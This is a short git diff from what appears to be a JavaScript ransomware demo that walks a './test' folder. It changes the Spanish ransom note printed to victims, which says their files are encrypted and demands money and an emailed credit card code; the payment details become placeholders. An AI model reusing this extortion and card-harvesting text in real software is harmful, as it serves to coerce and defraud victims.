@@ -24,5 +24,5 @@ recursive("./test", ['index.js', 'index.exe', 'decrypt.js', 'decrypt.exe'] , (er
 console.log(`
 ¡UPS! Parece que todos tus archivos han sido encriptados :(
 
-  Podemos ayudarte dándote una clave secreta. Simplemente envíe algo de dinero al 88005553535 y escriba un correo electrónico a lolkekcheburek@superpuperpochta.com con el código de su tarjeta de crédito.`
+  Podemos ayudarte dándote una clave secreta. Simplemente envíe algo de dinero a "link paypal" y escriba un correo electrónico a ejemplo@ejemplo.com con el código de su tarjeta de crédito.`
   );
